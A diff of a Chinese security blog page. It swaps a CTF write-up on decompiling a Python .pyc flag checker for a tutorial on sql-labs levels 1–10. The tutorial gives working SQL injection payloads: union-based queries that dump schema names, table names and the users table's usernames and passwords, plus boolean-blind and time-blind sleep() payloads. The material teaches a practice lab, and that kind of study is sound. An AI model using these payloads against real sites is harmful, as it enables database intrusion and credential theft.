@@ -199,7 +199,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://froming.github.io/2021/06/24/2021%E5%B9%B4%E5%9B%9B%E5%B7%9D%E7%9C%81ctf%E6%AF%94%E8%B5%9Bpython%E5%8F%8D%E7%BC%96%E8%AF%91WP">
+    <link itemprop="mainEntityOfPage" href="https://froming.github.io/2021/06/24/superforming%E7%9A%84sql-labs%E5%A4%A7%E9%80%9A%E5%85%B3%E4%B9%8B%E7%AC%AC1%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90%E5%8F%8A%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -212,7 +212,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/06/24/2021%E5%B9%B4%E5%9B%9B%E5%B7%9D%E7%9C%81ctf%E6%AF%94%E8%B5%9Bpython%E5%8F%8D%E7%BC%96%E8%AF%91WP" class="post-title-link" itemprop="url">2021年四川省ctf比赛python反编译WP</a>
+          <a href="/2021/06/24/superforming%E7%9A%84sql-labs%E5%A4%A7%E9%80%9A%E5%85%B3%E4%B9%8B%E7%AC%AC1%E9%83%A8%E5%88%86%E8%A7%A3%E6%9E%90%E5%8F%8A%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95" class="post-title-link" itemprop="url">superforming的sql-labs大通关之第1部分解析及注入方法</a>
         </h2>
 
         <div class="post-meta-container">
@@ -224,7 +224,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2021-06-24 00:18:59 / 修改时间：12:31:39" itemprop="dateCreated datePublished" datetime="2021-06-24T00:18:59+08:00">2021-06-24</time>
+      <time title="创建时间：2021-06-24 00:26:05 / 修改时间：12:33:09" itemprop="dateCreated datePublished" datetime="2021-06-24T00:26:05+08:00">2021-06-24</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -232,7 +232,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+          <a href="/categories/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">靶场笔记</span></a>
         </span>
     </span>
 
@@ -246,23 +246,113 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="1-python文件反编译"><a href="#1-python文件反编译" class="headerlink" title="1.python文件反编译"></a>1.python文件反编译</h2><p>当一开始拿到题的时候，毫无头绪。这时想要看一下文件的源码，用记事本打开发现是乱码，回看文件类型发现是pyc文件。pyc文件是py文件变成exe文件的中间文件，可以理解为高级语言写的程序要先被编译为汇编语言后变为二进制程序。<br>那么我们有什么办法将pyc文件变成py文件呢？<br>这里要说的就是uncompyle工具，功能就是将pyc文件反编译成py文件，具体操作方法是将cmd命令行的指向指向pyc文件所在目录之后，输入如下指令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 -o *.py *.pyc</span><br></pre></td></tr></table></figure>
-
-<p>成功之后会是下图效果，<em>要注意的是要在环境变量中配置的路径是python2的python3会反编译不成功</em><br><img src="https://img-blog.csdnimg.cn/20210516193445326.png" alt="在这里插入图片描述"></p>
-<h2 id="2-python代码审计"><a href="#2-python代码审计" class="headerlink" title="2.python代码审计"></a>2.python代码审计</h2><p>当你得到反编译之后的py文件，就可以用编译器或者记事本查看，得到如下源码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.16 (v2.7.16:413a49145e, Mar  4 2019, 01:37:19) [MSC v.1500 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: 2.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2020-10-14 11:00:14</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">yourflag</span>):</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> yourflag:</span><br><span class="line">        x = <span class="built_in">ord</span>(i) ^ <span class="number">62</span></span><br><span class="line">        x = x + <span class="number">6</span></span><br><span class="line">        s += <span class="built_in">chr</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tureflag = <span class="string">&#x27;XlhlX0sMEWNiDxQQDgwTXl5eZRFgFWMOFBATXhMMYw8PD2UMZUk=&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;input your flag:&#x27;</span></span><br><span class="line">yourflag = raw_input()</span><br><span class="line"><span class="keyword">if</span> encode(yourflag) == tureflag:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;OHHHHHH~ correct!&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;emmm.. wrong&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>对源码进行审计，发现源码将真正的flag做了如下处理</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flowchat</span><br><span class="line">st=&gt;start: 加密前的flag</span><br><span class="line">e=&gt;end: 加密后的flag</span><br><span class="line">op=&gt;operation: 将flag根据ascii编码取整型之后按位异或为一个新数</span><br><span class="line">tag1=&gt;operation: 将上一步处理后的数值加六</span><br><span class="line">tag3=&gt;operation: 对数值进行base64编码</span><br><span class="line">tag2=&gt;operation: 处理后的新数根据ascii变成字符</span><br><span class="line"></span><br><span class="line">st-&gt;op-&gt;tag1-&gt;tag2-&gt;tag3-&gt;e</span><br></pre></td></tr></table></figure>
-
-<h2 id="3-还原flag"><a href="#3-还原flag" class="headerlink" title="3.还原flag"></a>3.还原flag</h2><p>还原flag，我们可以用以下思路</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flowchat</span><br><span class="line">st=&gt;start: 加密后的flag</span><br><span class="line">e=&gt;end: 加密前的flag</span><br><span class="line">op=&gt;operation: 我对加密后的flag进行base64解码</span><br><span class="line">tag1=&gt;operation: 按照ascii码取得数值之后减六</span><br><span class="line">tag2=&gt;operation: 将上一步处理之后的数据按位异或62之后就能得到之前的数值</span><br><span class="line">tag3=&gt;operation: 按照ascii将整型换成字符型输出</span><br><span class="line"></span><br><span class="line">st-&gt;op-&gt;tag1-&gt;tag2-&gt;tag3-&gt;e</span><br></pre></td></tr></table></figure>
-
-<p>按照如上的思路写脚本，得到如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        x = <span class="built_in">ord</span>(i) - <span class="number">6</span></span><br><span class="line">        x = x ^ <span class="number">62</span></span><br><span class="line">        s += <span class="built_in">chr</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">Base64_Encode_Flag = <span class="string">&#x27;XlhlX0sMEWNiDxQQDgwTXl5eZRFgFWMOFBATXhMMYw8PD2UMZUk=&#x27;</span></span><br><span class="line"></span><br><span class="line">Base64_Decode_Flag = base64.b64decode(Base64_Encode_Flag)</span><br><span class="line"></span><br><span class="line">Flag=encode(Base64_Decode_Flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> Flag</span><br></pre></td></tr></table></figure>
-
-<p>运行之后如下图<br><img src="https://img-blog.csdnimg.cn/20210516205301775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag</p>
+          <h2 id="提要"><a href="#提要" class="headerlink" title="提要"></a>提要</h2><p>本文中的sql语句不可以直接复制到靶场中注入，因为编辑的时候不一定是用英语符号，直接复制可能不会注入成功。我写这一系列的博客，主要是记录的自己的学习心路，以及给后来者一些引导，所以这一系列是教程系得博客。这也让我不会在前面的关卡说太多注入的东西，毕竟学东西讲究一个循序渐进，所以前面几关注入的更多方法留待聪明的你自己发现。</p>
+<h2 id="sql注入的基本概念"><a href="#sql注入的基本概念" class="headerlink" title="sql注入的基本概念"></a>sql注入的基本概念</h2><p>在开始闯关之前不妨先对sql注入有一个基本的概念，所谓sql注入，实际上就是通过<strong>漏洞</strong>将sql命令插入表单或输入域名或页面请求的查询字符串，把sql语句注入到后台数据库，从而把网站数据库中的信息提取出来。</p>
+<h2 id="（1）sql-labs第一、二、三、四关（联合查询）"><a href="#（1）sql-labs第一、二、三、四关（联合查询）" class="headerlink" title="（1）sql-labs第一、二、三、四关（联合查询）"></a>（1）sql-labs第一、二、三、四关（联合查询）</h2><ul>
+<li>还可以布尔盲注，时间盲注和报错注入</li>
+</ul>
+<h3 id="lt-1-gt-前四关的区别"><a href="#lt-1-gt-前四关的区别" class="headerlink" title="&lt;1&gt;前四关的区别"></a>&lt;1&gt;前四关的区别</h3><p>进行sql注入有不同的方法，前四关都是一种类型，它们的不同之处在与包裹数据的方式不同（<strong>看图观察‘$id’变量的包裹方式</strong>）。之所以说它们是有别于之后几关的sql注入，是因为它们会直接把id对应的‘username’和’password’回显到网页中(<strong>观察if语句中的内容</strong>)。下面附图说明不同。</p>
+<ul>
+<li>第一关集成环境中的部分源码<br><img src="https://img-blog.csdnimg.cn/20210123124317740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
+<li>第二关集成环境中的部分源码<br><img src="https://img-blog.csdnimg.cn/20210123124504873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
+<li>第三关集成环境中的部分源码<br><img src="https://img-blog.csdnimg.cn/20210123124535735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
+<li>第四关集成环境中的部分源码<br><img src="https://img-blog.csdnimg.cn/20210123124602252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
+</ul>
+<p>通过观察可以发现每一关的包裹数据的方式都不相同</p>
+<p>第一关：通过’$id’的方式包裹</p>
+<p>第二关：通过$id的方式包裹</p>
+<p>第三关：通过(‘$id’)的方式包裹</p>
+<p>第四关：通过($id)的方式包裹</p>
+<p>根据包裹方式的不同，注入时也是略有不同。<br>一般包裹方式就是七中分别是：id、’id’、(‘id’)、((‘id’))、”id”、(“id”)、((“id”))。确定类型以后可以使用手工测试的方式进行确定。</p>
+<h3 id="lt-2-gt-联合查询可以用到的sql语句及函数"><a href="#lt-2-gt-联合查询可以用到的sql语句及函数" class="headerlink" title="&lt;2&gt;联合查询可以用到的sql语句及函数"></a>&lt;2&gt;联合查询可以用到的sql语句及函数</h3><p>（1）推断有多少列的方法：</p>
+<p>order by  [参数] （可以判断有多少列，它的作用是将回显信息排列，’参数’的作用是指明按哪一对应的列排序）</p>
+<p>（2）联合查询：</p>
+<p>union的使用 （使用时需要注意，union明确要求前后语句回显的列要相同）</p>
+<p>（3）查库：</p>
+<p>select schema_name from information_schema.schemta;</p>
+<p>（4）查表：</p>
+<p>select table_name from information_schema.tables where table_schema=’库名’；</p>
+<p>（5）查列：</p>
+<p>select column_name from information_schema.columns where table_name=’表名’；</p>
+<p>（6）其它</p>
+<p>?id=-1’ union select 1,2,group_concat(sechma_name) from information_schema.schemata–+;<br><strong>其中group_concat的作用是使同一个分组中的值连接起来，返回一个字符串结果。</strong></p>
+<h3 id="lt-3-gt-以第一关为例（第二，三，四关类似第一关，只需要将以下所讲的每一条语句中的包裹方式换成上面所推测出的各关的包裹方式）"><a href="#lt-3-gt-以第一关为例（第二，三，四关类似第一关，只需要将以下所讲的每一条语句中的包裹方式换成上面所推测出的各关的包裹方式）" class="headerlink" title="&lt;3&gt;以第一关为例（第二，三，四关类似第一关，只需要将以下所讲的每一条语句中的包裹方式换成上面所推测出的各关的包裹方式）"></a>&lt;3&gt;以第一关为例（第二，三，四关类似第一关，只需要将以下所讲的每一条语句中的包裹方式换成上面所推测出的各关的包裹方式）</h3><ul>
+<li><p>1.第一步（判断是否存在注入）<br>先在url栏里面输入?id=1’，如果报错则说明，存在注入。<br><img src="https://img-blog.csdnimg.cn/2021012315172969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+</li>
+<li><p>2.第二步（判断查询语句查询结果的列数）<br>在url栏中输入?id=1’ order by 数字–+（<strong>‘–+’在sql中是注释符，这样让之后的语句不能执行，只能执行我们注入的语句。数字要从1开始逐个尝试，直到报错。最后则说明表里面有报错的数前一个的数的列数</strong>）<br>由下面两副图你会发现查询语句最后的回显中一共有三列<br><img src="https://img-blog.csdnimg.cn/20210123133259926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/202101231333080.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+</li>
+<li><p>3.第三步（判断表中哪几列的信息会回显）<br>在url栏的域名后输入?id=-1’ union select 1,2,3–+<br>因为前四关会有回显，所以看回显出的是哪几个数字就能判断出哪几列会回显到网页上，由下图可知是第2、3列会回显的网页中<br><img src="https://img-blog.csdnimg.cn/20210123132910354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+</li>
+<li><p>4.第四步（查库名）<br>在url栏里面输入:?id=-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata –+或者输入?id=-1’ union select 1,2,schema_name from information_schema.schemata limit 1,1–+(<em><strong>limit的作用是限制回显的库名是第几个</strong></em>)这里主要是说明一下limit的用法，因为下面几关会用到,到时候不做说明。(<em><strong>同时需要注意1前面的-是不可少的主要作用是使第一句的查询结果不要显示</strong></em>)<br><img src="https://img-blog.csdnimg.cn/20210123134300489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+</li>
+<li><p>5.第五步（查表名）<br>要输入的是:?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+<br><img src="https://img-blog.csdnimg.cn/20210123134645148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+</li>
+<li><p>6.第六步(查列名)<br>在url栏输入：?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+<br><img src="https://img-blog.csdnimg.cn/20210123134825265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+</li>
+<li><p>7.第七步（提取数据）<br>输入：?id=-1’ union select 1,2,group_concat(concat_ws(‘<del>‘,username,password)) from users–+（‘concat_ws’的作用是将‘username’和’password’合并回显，同时在它们中间插入‘</del>’）<br><img src="https://img-blog.csdnimg.cn/20210123140534263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+</li>
+</ul>
+<h2 id="（2）sql第五关到第八关（布尔盲注）"><a href="#（2）sql第五关到第八关（布尔盲注）" class="headerlink" title="（2）sql第五关到第八关（布尔盲注）"></a>（2）sql第五关到第八关（布尔盲注）</h2><ul>
+<li>还可以时间盲注，报错注入</li>
+</ul>
+<h3 id="lt-1-gt-第五、六、七、八关的不同"><a href="#lt-1-gt-第五、六、七、八关的不同" class="headerlink" title="&lt;1&gt;第五、六、七、八关的不同"></a>&lt;1&gt;第五、六、七、八关的不同</h3><p>和前四关不同的是第五关到第八关没有将搜索到的信息回显到网页上（注意观察if语句中的内容），但是和前四关相同的是它们之间的不同也是包裹‘id’变量的方式不同（注意观察’id’变量）**(值得说明的是第五关和第八关的包裹方式相同，但是它们还有一个区别是当输入错误的语句时，第五关会返回错误的提示而第八关则不会，读者可以留意下图中第五关和第八关的源码)**</p>
+<ul>
+<li><p>第五关<br><img src="https://img-blog.csdnimg.cn/20210123141337597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+</li>
+<li><p>第六关<br><img src="https://img-blog.csdnimg.cn/2021012314134874.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+</li>
+<li><p>第七关<br><img src="https://img-blog.csdnimg.cn/20210123141355384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+</li>
+<li><p>第八关<br><img src="https://img-blog.csdnimg.cn/20210123141406703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">第五关的包裹方式：’id’</p>
+</li>
+</ul>
+<p>第六关的包裹方式：id</p>
+<p>第七关的包裹方式：((‘id’))</p>
+<p>第八关的包裹方式：’id’</p>
+<h3 id="lt-2-gt-布尔盲注可以用到的sql语句及函数"><a href="#lt-2-gt-布尔盲注可以用到的sql语句及函数" class="headerlink" title="&lt;2&gt;布尔盲注可以用到的sql语句及函数"></a>&lt;2&gt;布尔盲注可以用到的sql语句及函数</h3><p>较前四关而言第五关到第八关不同之处在于没有回显，我们不能直观的看见信息，所以我们需要一种新的方式进行sql注入——布尔型注入</p>
+<p>1.substr()函数：格式是substr(a,b,c)意思是将a字符串从b位置截取c长度</p>
+<p>举例： select substr((select schema_name from information_schema.schemata limit 0,1),1,1)=’i’;</p>
+<p>2.ascii()函数：将括号中的字符转换为acsii码，再在最后进行值大小的判断，正确返回1，错误返回0</p>
+<p>举例： select ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))&gt;1;</p>
+<p>3.模糊查询：要用到like函数</p>
+<p>举例： &lt;1&gt;在mysql navicat中查字段会出现的情况有</p>
+<p>​                   (1)select database() like ‘%s%’;表示库名中是否有一个带有s</p>
+<p>​                   (2) select database() like ‘s%’;表示库名中是否有一个开头字符为s</p>
+<p>​            &lt;2&gt;在电脑自带的命令行中进入mqsql则情况完全不同如果用 select database() like ‘字符’;它没有在mqsql navicat中那么多的情况，只有一种就是’字符%‘，这种情况的原因是我们已经锁定了一个数据库导致的。</p>
+<p>4.regexp函数，regexp为匹配security正则表达式</p>
+<p>举例： select database() regexp ‘s’;</p>
+<p> 5.left函数，从字符串开头截取括号中的数字个长度的字符</p>
+<p>举例：select left((select schema_name from information_schema.schemata limit 0,1),1)=’i’;</p>
+<h3 id="lt-3-gt-以第五关为例（第六，七，八关类似第五关，只需要将以下所讲的每一条语句中的包裹方式换成上面所推测出的各关的包裹方式）"><a href="#lt-3-gt-以第五关为例（第六，七，八关类似第五关，只需要将以下所讲的每一条语句中的包裹方式换成上面所推测出的各关的包裹方式）" class="headerlink" title="&lt;3&gt;以第五关为例（第六，七，八关类似第五关，只需要将以下所讲的每一条语句中的包裹方式换成上面所推测出的各关的包裹方式）"></a>&lt;3&gt;以第五关为例（第六，七，八关类似第五关，只需要将以下所讲的每一条语句中的包裹方式换成上面所推测出的各关的包裹方式）</h3><p>本文的做题方法选用的是基于联合查询的布尔盲注，在下一部分会讲不基于布尔查询的盲注。</p>
+<ul>
+<li><p>1.第一步：（判断是否存在注入）<br>输入?id=1’判断是否有sql注入,通过下图判断出，存在sql注入。<br><img src="https://img-blog.csdnimg.cn/20210123151837705.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+</li>
+<li><p>2.第二部（判断查询语句查询结果的列数）<br>输入：?id=1’ order by 3–+得到<br> <img src="https://img-blog.csdnimg.cn/20210125123601592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">再输入：?id=1’ order by 4–+得到<br><img src="https://img-blog.csdnimg.cn/20210125123650710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">最后可以发现，查询语句查询结果有三列</p>
+</li>
+<li><p>3.第三步（和前四关不同的是这里没有回显，所以就不需要通过联合查询判断哪几列会回显到网页上，直接判断数据库名）<br>输入：<br>?id=1’ union select 1,2,substr((select schema_name from information_schema.schemata limit 4,1),1,1)=’s’–+<br>或者<br>?id=1’ union select 1,2,select left((select schema_name from information_schema.schemata limit 4,1),1)=’s’–+<br>又或<br>?id=1’ union select 1,2,ascii(substr((select schema_name from information_schema.schemata limit 4,1),1,1))&gt;0–+<strong>通过二分法和ascii函数联合的方式进行判断</strong></p>
+</li>
+</ul>
+<p>还有很多盲注的方式这里不再一一介绍，通过多种函数的联合的方法可以有许多不同的方法，留待读者自己去发现。总体思路就是输入一段语句，让服务器判断正误，通过网页回显进行猜测。一般盲注都会通过burpsuite等软件进行操作，具体的使用方法请读者自行寻找对应文章。</p>
+<ul>
+<li>4.第四、五、六步基本上与第三步的思路相同，只是其中的一些关键字不再相同，读者结合前四关的基础和这一部分所讲的盲注方式，一定可以轻易的理解，并使用，所以第四、五、六步不再赘述。</li>
+</ul>
+<h2 id="（3）第九关与第十关（时间盲注）"><a href="#（3）第九关与第十关（时间盲注）" class="headerlink" title="（3）第九关与第十关（时间盲注）"></a>（3）第九关与第十关（时间盲注）</h2><ul>
+<li>还可以报错注入</li>
+</ul>
+<p>与第五关到第八关不同第九关到第十关只能用时间盲注，原因是无论输入的语句正确与否都会得到相同的回显‘you are in………..’,所以为了判断输入语句正确与否</p>
+<h3 id="lt-1-gt-只能用时间盲注的原因"><a href="#lt-1-gt-只能用时间盲注的原因" class="headerlink" title="&lt;1&gt;只能用时间盲注的原因"></a>&lt;1&gt;只能用时间盲注的原因</h3><p>与第五关到第八关不同第九关到第十关只能用时间盲注，原因是无论输入的语句正确与否都会得到相同的回显‘you are in………..’,所以为了判断输入语句正确与否,要用到一个新的函数if()和sleep(),这样通过相应客户端的时间就知道输入语句是否正确，得到的结果是否正确。</p>
+<h3 id="lt-2-gt-第九关、第十关的不同"><a href="#lt-2-gt-第九关、第十关的不同" class="headerlink" title="&lt;2&gt;第九关、第十关的不同"></a>&lt;2&gt;第九关、第十关的不同</h3><p>老规矩贴图为例，和之前提过的观察点相同。<br>1.第九关集成环境中的源码<br><img src="https://img-blog.csdnimg.cn/20210123150555152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">2.第十关集成环境中的源码<br><img src="https://img-blog.csdnimg.cn/20210123150705532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMDYxOTMz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">第九关包裹方式：’id’<br>第十关包裹方式：id</p>
+<h3 id="lt-3-gt-学习时间盲注补充的sql语句及函数"><a href="#lt-3-gt-学习时间盲注补充的sql语句及函数" class="headerlink" title="&lt;3&gt;学习时间盲注补充的sql语句及函数"></a>&lt;3&gt;学习时间盲注补充的sql语句及函数</h3><p>1.格式：sleep(n)<br>这个函数的意思是让程序晚n秒执行。<br>2.格式：if(A,B,C)<br>意思是若A为真，则执行B,若A为假，则执行C。</p>
+<h3 id="lt-4-gt-以第九关为例（第十关类似第九关，只需要将以下所讲的每一条语句中的包裹方式换成上面所推测出的各关的包裹方试）"><a href="#lt-4-gt-以第九关为例（第十关类似第九关，只需要将以下所讲的每一条语句中的包裹方式换成上面所推测出的各关的包裹方试）" class="headerlink" title="&lt;4&gt;以第九关为例（第十关类似第九关，只需要将以下所讲的每一条语句中的包裹方式换成上面所推测出的各关的包裹方试）"></a>&lt;4&gt;以第九关为例（第十关类似第九关，只需要将以下所讲的每一条语句中的包裹方式换成上面所推测出的各关的包裹方试）</h3><ul>
+<li><p>1.第一步（判断是否存在注入）<br>输入?id=1’ and sleep (5)–+判断是否有sql注入,如果没有立即相应客户端，则说明存在漏洞。</p>
+</li>
+<li><p>2.第二步（因为没有回显，所以直接进行判断库的操作）</p>
+</li>
+<li><p>输入?id=1‘ and if((substr((select schema_name from information_schema.schemata limit 4,1),1,1)=’s’),1,sleep(3))–+通过给的句子进行不断猜解，就可以查到库名。</p>
+</li>
+<li><p>3.用近似的语句可以查表名、列名及表中信息，通过前面的练习，相信读者已经对sql注入有了了解，重复的部分不再赘述。</p>
+</li>
+</ul>
 
       
     </div>
@@ -282,7 +372,7 @@
 
 
   <nav class="pagination">
